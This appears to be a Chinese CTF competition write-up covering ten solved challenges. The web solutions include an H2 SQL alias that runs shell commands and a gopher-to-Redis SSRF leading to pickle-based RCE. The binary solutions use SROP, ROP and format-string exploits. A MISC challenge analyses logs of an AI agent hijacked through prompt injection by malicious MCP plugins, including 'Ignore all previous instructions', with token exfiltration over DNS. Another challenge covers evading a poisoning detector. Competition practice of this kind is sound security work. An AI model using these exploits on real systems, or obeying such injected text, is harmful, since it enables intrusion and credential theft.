# 解题思路

## 请注意

1. 解题过程中，关键步骤不可省略，不可含糊其辞、一笔带过。
2. 解题过程中如是自己编写的脚本，不可省略，不可截图（代码字体可以调小；而如果代码太长，则贴关键代码函数）。
3. 所有解出的题目都必须书写 WRITEUP，缺少一个则视该 WRITEUP 无效，成绩将无效。
4. WRITEUP 如过于简略和敷衍，导致无法形成逻辑链条推断出对题目有分析和解决的能力，该 WRITEUP 可能被视为无效，成绩将无效。
5. 提交 PDF 版本即可。
6. 必须包含获得 flag 截图。
7. 每只队伍由队长统一提交一份解题思路即可，所有解题过程需保存在一个 PDF 内上传。
8. 平台仅保留队伍最后一份解题思路，此前提交的解题思路将会自动覆盖。

## 团队信息

- 团队名称：**<team>**
- 队员组成：**<name>（单人队）**

## 解题情况

- 赛事：2026 羊城杯（DASCTF 平台，match 1750），赛程 10:00–15:00，共 25 题。
- 结果：**解出 10 题**；平台提交 19 次（10 次成功 / 9 次失败）。
![平台答题情况：团队 <team>，绿色为「已解答」题目（WEB 3/4，题号导航中绿色格子）](assets/wp/solve-status.png)

- 平台侧「已解答」清单见上图（绿色格子）。本队共解出 10 题；每题的具体 flag 与平台提交回包原文见各题末的「提交回包」图，
  其数据源为 `evidence/submit-log.jsonl`（平台 API 原始响应，含 `code:"00000" 解题成功` 与 `eventId`）。
- 另附一页提交台账总览（同一数据源的汇总视图）：

![解题情况总览：10 条 result:true 记录](assets/wp/summary.png)

## 具体WP

> 以下按 WEB / PWN / REVERSE / MISC 顺序填写；每题含关键步骤、关键代码与提交回包。

### WEB

#### 题目一：12063 GraphNexus

- 分类 / 分值 / 解出：WEB / 200.00 / 436 队（赛事终了时平台数据）
- flag：`70885042158481839369551396905847`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"correct":true,"eventId":83954}}`

**步骤一：摸清服务形态。** 目标是一个 WebSocket 服务：需要先发 hello 完成初始化，再 `SUBSCRIBE` 订阅房间；`/ws/admin` 是纯诱饵（不存在的管理端点）。

**步骤二：找到可用窗口。** `SUBSCRIBE` 必须在收到「101 响应头已解析」与「hello 帧被消费」之间发出。三种写法被判死：先读 hello 再订阅（`SUBSCRIBE_FAILED`）、塞进 upgrade 同 TCP 段（被丢弃）、两连接互发（无效）；把「读不读 hello」隔离成唯一变量后即可稳定复现。

**步骤三：注入 DSL。** 订阅成功后，帧格式为 `opcode:1 | len:int32 BE | payload`，`op 0x05` 的 payload 是裸 DSL 字符串；用 `SQL(<sql>)` 包裹可执行任意 SQL（`H2 2.2.224`），用 `NEXUS_ADMIN` 提升权限。

**步骤四：读文件拿 flag。** `CREATE ALIAS ... AS $$ Runtime.exec $$` + `CALL EXECF('id')` 落地命令执行（`uid=1000(appuser)`）；`/flag.txt` 为 root 400，靠同目录 setuid 的 `/readflag` 读取。

**注意点：** `SQL()` 会吃掉最后一个字符，需用空格收尾；重探测后服务会临时限流（拒绝订阅 + 偶发 RST），停 30–60 秒自愈。

**关键代码（`scripts/12063-solve.py` 节选）**

```python
def ws_frame(p, op=0x2):
    n = len(p)
    h = bytearray([0x80 | op])
    if n < 126:
        h.append(0x80 | n)
    elif n < 65536:
        h.append(0x80 | 126)
        h += n.to_bytes(2, "big")
    else:
        h.append(0x80 | 127)
        h += n.to_bytes(8, "big")
    mk = os.urandom(4)
    return bytes(h) + mk + bytes(b ^ mk[i % 4] for i, b in enumerate(p))



    def dsl(self, raw):
        try:
            self.s.sendall(ws_frame(build(0x05, raw)))
            data = read(self.s, 1.5)
        except (ConnectionResetError, BrokenPipeError, OSError):
            # the server throttles/aborts under load: re-enter the race and retry once
            time.sleep(2.0)
            self.s = None
            if not self.subscribe_with_retry(attempts=4):
                return [{"error": "reconnect failed"}]
            self.s.sendall(ws_frame(build(0x05, raw)))
            data = read(self.s, 1.5)
        out = []
        for op, p in decode(data):
            if p[:4] == b"GNX!":
                out.append({"gnx_bytes": len(p)})
                continue
            try:
                out.append(json.loads(p.decode("utf-8", "replace")))
            except Exception:
                out.append(p.decode("utf-8", "replace"))
        return out


    def deploy_exec_alias(self, name="EXECF"):
        # the alias may already exist from an earlier run: probe before creating
        who = self.call(name, "id")
        if "uid=" in who:
            return True, who
        src = ('CREATE ALIAS %s AS $$ String f(String c) throws Exception {'
               ' java.util.Scanner sc = new java.util.Scanner('
               'Runtime.getRuntime().exec(new String[]{"sh","-c",c})'
               '.getInputStream()).useDelimiter("\\\\A");'
               ' return sc.hasNext() ? sc.next() : ""; } $$' % name)
        self.sql(src)
        out = self.call(name, "id")
        return ("uid=" in out), out

```

![12063 提交成功回包](assets/wp/flag-12063.jpg)

#### 题目二：12064 DataPulse

- 分类 / 分值 / 解出：WEB / 373.43 / 175 队（赛事终了时平台数据）
- flag：`61384818490737473322962843864311`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"hasCheated":false,"eventId":87845,"correct":true}}`

**步骤一：找到 SSRF 源点。** `POST /tasks/<uuid>/retry-webhook` 由服务端发起请求，并把响应体原样写进 `webhook-logs` 回显；URL 校验只做 **host 精确匹配** `{127.0.0.1, localhost, 0.0.0.0}` 加 **scheme 白名单（放行 gopher）**，`127.1` / `2130706433` / `0x7f000001` / `127.0.0.1.nip.io` 均可绕过。

**步骤二：把 SSRF 变成 Redis 客户端。** `gopher://127.1:6379/_<RESP>` 可发送任意 RESP 命令（先以 `PING` 得到 `+PONG` 验证）；因每次 webhook 都是新连接，多条命令必须在同一 payload 内以 `\r\n` 连发。

**步骤三：确认可利用的下游。** `KEYS *` 得 25 个 `celery-task-meta-*` 与 2 个 `_kombu.binding.*`；`INFO` 显示 `redis_version:7.0.15`，且 `CONFIG` 被禁用（不能写文件），Celery 侧 `accept_content` 为 JSON-only（pickle 消息不执行）⇒ 真正入口是 **Django 会话**：`db1` 里是 `:1:django.contrib.sessions.cache<sid>` 的**裸 pickle**。

**步骤四：会话 pickle 投毒。** 用随机 sid 写入一个 pickle dict 即被接受（`/api/v1/profile/` 返 200）；先把 payload 写成 `eval("{'user_id':2,'role':'analyst'}")` 返回合法 dict，确认 **eval 确实被调用**，再换成 `__reduce__ = (eval, (code,))` 执行任意代码（此步一次请求即可定性，避免把「payload 抛异常」误判成「被白名单拦截」）。

**步骤五：读 flag。** RCE 落地为 `uid=1000(ctf)`；`/flag.txt` 是 `r-------- root`，但根目录有 **setuid `/readflag`**，执行即得 flag。

**注意点：** `/api/v1/admin/`（IP 白名单不含 loopback，服务端自打仍 403）与 `/api/v1/export/`（恒 503）均为诱饵；`fake_admin_session_1/2` 的 `_auth_user_hash: fake_hash_do_not_use` 也是诱饵；单 worker Flask 会被并发扫描打爆，超时属负载假象。

**关键代码（`scripts/12064-solve.py` 节选）**

```python
def resp(*args) -> bytes:
    """RESP array, as a raw byte string for gopher."""
    out = b'*%d\r\n' % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b'$%d\r\n%s\r\n' % (len(a), a)
    return out


```

![12064 提交成功回包](assets/wp/flag-12064.jpg)

### PWN

#### 题目一：12078 cacheline

- 分类 / 分值 / 解出：PWN / 439.49 / 122 队（赛事终了时平台数据）
- flag：`DASCTF{98938704929480850631344062720644}`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","result":true,"data":{"isCorrect":true,"hasCheated":false,"eventId":84171,"correct":true}}`

**步骤一：被动 triage。** `file`/`checksec`/`imports`/`strings` 四步确定形态：musl 静态、Full RELRO + PIE + NX、seccomp 禁 `execve`；`imports` 里出现 `open("/home/vault/flag")` 与 `dup2(...,7)`，说明拿 shell 无意义，应直接读 fd 7。

**步骤二：画拓扑。** `HTTP → nginx 模块(cacheline.so) → /run/cacheline-broker.sock → cachebroker(uid1001) → /run/cacheline-vault.sock → cachevault(uid1002)`。三层各有一张「交叉认证对象图」，用同一个自研 keyed-hash（splitmix64/siphash13 变体）校验。

**步骤三：复现 hash。** 由 `module`/`broker`/`vault` 三处泄漏原语（十六进制打印）反推 `key`，用本地实现的 hash 与线上逐字段对齐（`create → link → dump → import` 的调用顺序会让 hash 失效，必须先 link 再 dump）。

**步骤四：改指针。** broker 侧 `commit` 用 `PERMIT[1]^MANDATE^key2^ror(MANDATE[5],0x13)` 计算指针，把它改成 `FUN_00104000` 使 broker 变成到 vault 的 raw 代理；vault 侧 `cmd 0x40` 同法改成 `.text` 尾部 `lea rsp,[rdi+0x40]; ret`，把栈迁移到 `CONTEXT+0x40` 的 0x400 字节 ROP 链。

**步骤五：读 fd。** ROP 用 `read(7,buf,0x100)` + `write(1,buf,0x100)` 直接把 flag 打回 HTTP 响应体。

**注意点：** 每层 key 都是 per-connection，必须在同一连接内先泄漏再伪造；`CLVPLAN[5]` 的常量是运行时地址 `base+0x17f0`（lea 而非 mov），且 `CLVPLAN[4]` 必须等于 `CONTEXT[1]`。

**关键代码（`scripts/12078-solve.py` 节选）**

```python
def H(k1, k2, buf, n, c1=0x9e3779b97f4a7c15):
    h = fin((k1 ^ n ^ c1) & M64); kv = k2 & M64; iv = 0
    for i in range(n):
        x = fin((buf[i] + kv) & M64)
        h = ((k1 ^ iv) + rol(x ^ h, 0x11 + 0xb * i)) & M64
        kv = (kv + 0x517cc1b727220a95) & M64
        iv = (iv + 0x6a09e667f3bcc909) & M64
    return fin((k2 ^ h ^ 0xa54ff53a5f1d36f1) & M64)
```

![12078 提交成功回包](assets/wp/flag-12078.jpg)

### PWN

#### 题目二：12067 Goodbye!shell

- 分类 / 分值 / 解出：PWN / 200.00 / 289 队（赛事终了时平台数据）
- flag：`59889675273415859764617608126761`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"correct":true,"eventId":84965}}`

**步骤一：栈上取地址。** 程序把输入读到一个栈缓冲，读出后逐字节回显；读站点 `lea rax,[rbp-0x20]` 说明**返回地址与输入在同一栈帧**，`rbp` 可控 ⇒ 可精确计算每个窗口的位置。

**步骤二：构造 SROP 触发。** 让 `rbp=0x2f`，则 `rax=15=__NR_rt_sigreturn`；`call read@plt` 直接进 syscall（`rax` 已由 `rbp-0x20` 算出），内核按我们放在栈上的 `sigframe` 恢复上下文。

**步骤三：分窗口精确落地。** `call read@plt` 会把返回地址压到**上一个窗口 +8**，逐窗口污染 sigframe；因此按窗口偏移 `{0x00,0xd0,0x38,0x50,0x70,0x90,0xb0}` 分别选择入口 `0x40122b/0x401227`，让被污染的 qword 只落在无害字段。

**步骤四：链式读 flag。** frame#1 执行 `openat(AT_FDCWD,"/flag")`，后续每一步再用 SROP 控制 `rdi/rsi/rdx/r10`，最后 `sendfile(1, fd, 0, 0x200)` 输出。

**注意点：** `sigcontext.fpstate`（frame+0xe0）必须清零（该页有 loader 残留 `0x0015000100000054`，否则 `badframe` → SIGSEGV/SI_KERNEL，极易被误判成 CET/IBT 拦截）；`cs/ss` 必须写 `0x33/0x2b`。

**关键代码（`scripts/12067-solve.py` 节选）**

```python
def build_frame(rax, rdi, rsi, rdx, r10, rip, rsp):
    """sigframe bytes, placed exactly at rsp when rt_sigreturn executes"""
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx, f.r10 = rax, rdi, rsi, rdx, r10
    f.rip, f.rsp = rip, rsp
    b = bytearray(bytes(f))
    b[0x18:0x1C] = p32(SS_DISABLE)       # uc_stack.ss_flags
    b[0x00:0x08] = p64(READ_SITE)        # uc_flags slot doubles as trigger ret
    b[0xB0:0xB8] = p64(0x202)            # eflags (IF, no TF/NT)
    b[0xB8:0xC0] = p64(CS_SS_QWORD)      # cs/gs/fs/ss
    return bytes(b)


```

![12067 提交成功回包](assets/wp/flag-12067.jpg)

### PWN

#### 题目三：12072 justledger

- 分类 / 分值 / 解出：PWN / 277.56 / 232 队（赛事终了时平台数据）
- flag：`25095531057106159885093049234276`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"correct":true,"eventId":84513}}`

**步骤一：三关拓扑。** 一条 TCP 连接打到三关：`lease`（SQLite 自定义函数）→ `broker`（WINDOW 命令的 8-bit 边界 bug）→ `vault`（`%p` 格式串 + `op 0xA7` 的 `(u8)len < 0x81` 溢出）。

**步骤二：第 1 关解锁。** `ledger_bind` 要求 `sqlite3_value_pointer(前一条语句 xFilter 捕获值) == "ledger.lease"`；用 `SELECT ledger_bind(ledger_seed(),1)` 一条语句捕获、并让 `xFilter` 把捕获的寄存器地址写入可回读列，跨语句满足 `f5470≠f5478`。

**步骤三：第 2 关越界。** `WINDOW 'k'` 有 8-bit 和边界 bug，越界改相邻 `ROUTE` 的 `[2]/[3]`（PIE 由 `[6]` 泄、rnd 由 `[5]` 反推、`hash=splitmix64` 重算）→ `--'` 跳 `base+0x2120` 的 relay 打通 vault。

**步骤四：第 3 关读 flag。** `%p`×78 泄 canary(slot77)/PIE → GOT 地址塞进格式串 `%s` 泄 libc → `%s` 泄 `.bss+0x4430` 得 flag fd → `op 0xA7` 的 `(u8)len<0x81` 溢出（canary@0x108 / ret@0x128）→ `sendfile(1, flagfd, 0, 0x200)`。

**注意点：** 前两关的「常量」实为运行时地址（`lea`），必须回汇编确认是立即数还是 lea；`ledger_bind` 的跨语句约束不是死路，块尺寸被 tcache 复用后只要寄存器数目匹配、把 `ledger_seed()` 放在第一个实参即可。

**关键代码（`scripts/12072-solve.py` 节选）**

```python
def ror(x, n):
    return ((x >> n) | (x << (64 - n))) & MASK64



def mix(seq, enc, rnd):
    x = (seq ^ enc ^ rnd ^ C0) & MASK64
    x = ((x >> 0x1E) ^ x) * C1 & MASK64
    x = ((x ^ (x >> 0x1B)) * C2) & MASK64
    return (x ^ (x >> 0x1F)) & MASK64


```

![12072 提交成功回包](assets/wp/flag-12072.jpg)

### REVERSE

#### 题目一：12085 VVMM

- 分类 / 分值 / 解出：REVERSE / 200.00 / 371 队（赛事终了时平台数据）
- flag：`flag{J1nxI_i5_4_6eautiful_g1rl}`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"correct":true,"eventId":85875}}`

**步骤一：识别 VM 结构。** 二进制把程序与寄存器打包成自定义容器（`read_va` 解容器、`load_program` 载入），指令 16 位宽、操作数走一个自研 8 位加解密（`_rol8`/`_ror8`）。

**步骤二：还原解释器。** 逐条还原 `decode`（指令解码）与 `ce0`（murmur3 风格 finalizer，用于校验/派生），得到完整 ISA 与分支条件。

**步骤三：把约束交给 z3。** 输入 32 字节、经 VM 逐字节变换后与常量比较；把每条指令翻译成位向量表达式、以常量表为约束，交给 z3 求解得到 flag。

**注意点：** VM 内部有「自校验常量」，直接用截获的寄存器值会失败；先把 `ce0` 复现、再把校验当约束一起解。

**关键代码（`scripts/12085-solve.py` 节选）**

```python
def ce0(a, b):
    """FUN_140002ce0 -- murmur3-style finalizer on a*0x9e3779b9 ^ (b+0x6d2b79f5)."""
    a &= M32; b &= M32
    u = (((a * 0x9e3779b9) & M32) ^ ((b + 0x6d2b79f5) & M32)) & M32
    u = (((u >> 16) ^ u) * 0x85ebca6b) & M32
    u = (((u >> 13) ^ u) * 0xc2b2ae35) & M32
    return ((u >> 16) ^ u) & M32

```

![12085 提交成功回包](assets/wp/flag-12085.jpg)

### MISC

#### 题目一：12083 Lost_Memory

- 分类 / 分值 / 解出：MISC / 314.26 / 213 队（赛事终了时平台数据）
- flag：`We_wi1l_m3et_ag4in_a7_d4wn`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"hasCheated":false,"eventId":83745}}`

**步骤一：解附件与镜像。** 题面自带密码的 `Linxiao.zip` 解出 64 GB `YCB_linxiao.E01`；E01 **未压缩存储**，可按 32 KB chunk + 4 B CRC 线性寻址（用 `mmls`/`fls`/`icat` 直读，不必全量解压）。

**步骤二：切分区。** `mmls` 得 GPT：EFI / MSR / NTFS 主盘（offset 239616 扇区）/ 一个 637 MB 无名分区（实为 WinRE，不是芯片固件）。

**步骤三：收五块碎片。** Chrome History 标题 `after`；git dangling blob `_all`；CompanyChat 消息 id=89（XOR 密钥＝芯片 ID `YA_20180507`）`_this`；UTF-16 崩溃日志 `_time`；桌面 PNG 的 **RGB bit0 顺序 LSB** `_always`。

**步骤四：拼串即口令。** 五片首尾相接 + `_` + 芯片编号连续形 `YA20180507` 得到 `after_all_this_time_always_YA20180507` —— 这是 `aiya_memory.dump` 的**解密口令**；`PBKDF2-HMAC-SHA256(10000)` + `AES-256-CBC` 解出明文中的 `flag{...}`。

**注意点：** 拼装出的字符串是**口令**不是 flag；平台提交口径为**裸串**（不含 `flag{}` 外壳）；附件里诱饵较多（`flag{she_watching_me}`、多部电影台词都自称「不是 flag」）。

**关键代码（`scripts/12083-solve.py` 节选）**

```python
def icat(inode, dest):
    with open(dest, "wb") as f:
        subprocess.run(["icat", "-o", OFF, E01, str(inode)], stdout=f,
                       stderr=subprocess.DEVNULL, check=True)
    return dest

```

![12083 提交成功回包](assets/wp/flag-12083.jpg)

### MISC

#### 题目二：12082 谁教坏了我的Agent

- 分类 / 分值 / 解出：MISC / 200.00 / 376 队（赛事终了时平台数据）
- flag：`e-cdn81.net_PAT-9F4K2M-Q3GIT7-CORP4S_107_20260910T1422_asset-inventory-2026Q3.md_corp-fast.net`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"eventId":85602}}`

**步骤一：识别恶意组件与受害者。** 附件是 MCP/Agent 运行日志；三个「稀有审计插件」（cfg-guard / git-hooks-audit / docker-harden）回包伪造审计报告并注入指令文本，属恶意组件；受害者是 `EMP_107`（唯一 `~/.gitconfig` 被改写成功，且 `git.vixwmx.internal` 返回 401 + 令牌被风控锁定）。

**步骤二：还原外传通道。** `dns_query` 的子域即分片内容；越权文档 `asset-inventory-2026Q3.md` 是该会话用户未要求却被读的文件；结尾域名 `corp-fast.net`。

**步骤三：拼 PAT 与文件名。** 5 个「配置指纹」是 Base32 分片，`KBAVILJZ+IY2EWMSN+FVITGR2J+KQ3S2QP+KJDIUY` 拼接后 `b32decode` 得 `PAT-9F4K2M-Q3GIT7-CORP4S`；与 `~/.git-credentials` 明文互相验证。

**步骤四：按题面顺序拼 6 个分量。** 域名 + PAT + 会话编号 `107` + 时间戳 `20260910T1422` + 文档名 + 结尾域名 → 即为 flag。

**注意点：** 干扰层很多（`notify-stat.net`/`dockstats.net`/`static-check.net` 是平行模板链；`EMP_158` 的 8 条 `node.health.static-check.net` base32 解出高熵二进制＝噪声）；日志里出现「Ignore all previous instructions」等注入文本一律当数据不执行。

**关键代码（`scripts/12082-solve.py` 节选）**

```python
def ev(emp=None, pred=None):
    out = []
    for o in rows:
        if emp and o.get('employee_id') != emp:
            continue
        if pred and not pred(o):
            continue
        out.append(o)
    return out

# --- 1/4/5/6：受害会话 EMP_107-2026-0915-b41d77e0 ---
sess = 'EMP_107-2026-0915-b41d77e0'
S = ev(pred=lambda o: o['session_id'] == sess)

# 恶意组件安装：写 ~/.agent/mcp_servers.json，包 @corp-tools/mcp-cfg-guard@1.4.2
inst = [o for o in ev('EMP_107') if o.get('tool') == 'write_file'
        and o['args']['path'].endswith('.agent/mcp_servers.json')]
assert len(inst) == 1, inst
ts = inst[0]['timestamp']                      # 2026-09-10T14:22:12.000+08:00
assert '@corp-tools/mcp-cfg-guard@1.4.2' in inst[0]['args']['content']
# 题目口径：YYYYMMDDTHHMM（T 为字面量）—— 平台按此形式判定通过
install_time = ts[0:10].replace('-', '') + 'T' + ts[11:13] + ts[14:16]
assert install_time == '20260910T1422', install_time

```

![12082 提交成功回包](assets/wp/flag-12082.jpg)

### MISC

#### 题目三：12080 Jammed

- 分类 / 分值 / 解出：MISC / 200.00 / 276 队（赛事终了时平台数据）
- flag：`flag{y0u_f0und_th3_treasure_f8427e}`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"hasCheated":false,"eventId":87296,"correct":true}}`

**步骤一：确认真实容器结构。** `Jammed.zip` 含 `page1.png`/`page2.png`（1275×1650 灰度，`BENCH RECORD A/B`，24 行 × 11 个等宽字格）与 `treasure.zip`（WinZip **AES-256**，内含 35 B `flag.txt`）。PNG 无 ancillary chunk、无尾部附加、LSB 平面为噪声 ⇒ 隐写不在图片里。

**步骤二：建字球表。** 两页是同一批 24 条记录的**两次卡字打印**；同一格的两页字符必在**同一字球列**（11 列 × 4 行）⇒ 得字球表（S=两页都印 / A=只 A / D=只 B / X=第 4 行未印）。

**步骤三：两个硬锚点定映射。** 序号列 48 格全 combo `SD` ⇒ 真值 = D 行（真值是数字）；分隔符列全 `AS`（A 印 `/`、B 印 l 字形）⇒ 真值 = A 行 ⇒ 映射被逼成唯一：`SS→S、SD→D、AS→A、AD→X`。

**步骤四：把搜索空间压到 20160。** frag 字段 48 格里 12 格落在 `AD` ⇒ 真值在第 4 行、只与列有关，只剩 **6 个未知字符**，且必须取自未出现的 8 个字母 `{a,i,m,o,r,s,v,w}` ⇒ `P(8,6)=20160`。

**步骤五：用最硬的验证器判定。** 附件给的 `sha256.txt` **不是口令哈希**（`sha256(真口令)=0193fddd…` ≠ `cfde9ebf…`，是干扰项）；改用 **AES-256 压缩包自带的 10 字节 HMAC-SHA1 认证码**判定，第一轮即命中 `{col1:m, col4:o, col6:i, col7:r, col8:a, col9:w}`，解出口令并用 `AES-256-CTR` 解出 `flag.txt`。

**注意点：** `1`/`l` 在该字体中字形相同（字格聚类复核确认不可消除），在正确判据下由候选枚举自然吸收；不要用「最大似然/统计」去猜真值行，必须用形状硬约束（锚点 + 字球 26+10+8=44）。

**关键代码（`scripts/12080-solve.py` 节选）**

```python
def resolve(a, b):
    """两页字符 → 字球列（l 与 1 字形相同，允许互换后再定列）"""
    out = []
    for c in range(11):
        aset = {S[c]} | ({AO[c]} if AO[c] else set())
        bset = {S[c], DN[c]}
        def ok(ch, s):
            if ch in s: return True
            if ch in 'l1': return ('l' if ch == '1' else '1') in s
            return False
        if ok(a, aset) and ok(b, bset): out.append(c)
    return out


def row_of(ch, c, page):
    """该页在此格印的是哪一行"""
    if ch == S[c] or (ch in 'l1' and S[c] == 'l'): return 'S'
    return 'A' if page == 'A' else 'D'

```

![12080 提交成功回包](assets/wp/flag-12080.jpg)

### AI

#### 题目一：12086 NeuralVault

- 分类 / 分值 / 解出：AI / 466.52 / 90 队（赛事终了时平台数据）
- flag：`86111530176209339321986958990035`
- 提交回包（平台 API 原始响应，截图见本节末）：`{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"hasCheated":false,"eventId":88043}}`

**步骤一：鉴权与接口面。** 服务用 `X-Audit-Token: <现场 token>` 鉴权（`/api/info` 每次铸新 token 且旧 token 仍有效；submit 10 次/token、detector 400 次/token）。

**步骤二：拿到联邦日志。** 正门端点是 **`GET /api/federation/log`**（1.7 MB ZIP，300 个 `.npy` ＝ 10 clients × 5 rounds × 6 张量：`dW1(32,48) dW2(48,48) dW3(48,16) db1 db2 db3`）。

**步骤三：定位投毒方。** 按末层 `dW3` 的**行 L2 范数**统计，`c3`/`c7` 的 `max/median` 为 6.26 / 3.46，其余 client 仅 1.1–2.9 ⇒ 投毒方为 `[3,7]`（`/api/debug` 返回的 `suspected_clients=[2,6]` 是 **0-indexed** 干扰项）。

**步骤四：读 audit_key。** 第 3 轮（r2）这两个 client 的 `dW3` **前 8 行行范数是精确整数**（其余行仅 ~0.003）：`c3=[5,12,13,16,1,16,1,16]`、`c7=[8,7,1,5,1,6,7,7]`，值域 1..16 ⇒ `nibble = norm − 1` ⇒ `4bcf0f0f` + `76040566` = **`4bcf0f0f76040566`**。

**步骤五：对抗样本过检测器。** 对 `base_sample` 做 L0-mask + L∞ 投影梯度上升（有限差分近似，12 维、`L∞=0.15`），把 class0(normal) 从 0.2315 抬到 **0.7063**（服务端要求 ≥0.6）；三件套（`[3,7]` + audit_key + bypass 向量）提交即得 flag。

**注意点：** 「50 条路径都 404」不能推出「端点不存在」——正门在**两段式前缀** `/api/federation/` 下，单段前缀枚举会全部漏掉。

**关键代码（`scripts/12086-solve.py` 节选）**

```python
def load_fedlog(zip_bytes: bytes) -> dict[tuple[int, int, str], np.ndarray]:
    out = {}
    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as z:
        for name in z.namelist():
            m = re.match(r"c(\d+)_r(\d+)_(\w+)\.npy$", name)
            if not m:
                continue
            with z.open(name) as f:
                out[(int(m.group(1)), int(m.group(2)), m.group(3))] = np.load(f)
    return out


```

![12086 提交成功回包](assets/wp/flag-12086.jpg)

## 附：环境与脚本

| 项 | 说明 |
|---|---|
| 平台 | DASCTF / slab-match（match 1750），自写客户端 `scripts/ycb.py`（取题、下载、提交、容器、公告） |
| 逐题脚本 | `scripts/<题号>-solve.py`（10 题，均在本地/靶机实测跑通） |
| 提交台账 | `evidence/submit-log.jsonl`（19 条原始回包） |
| 一手证据 | `evidence/`、`work/<题号>_*/`（反汇编、日志、PoC、协议记录） |

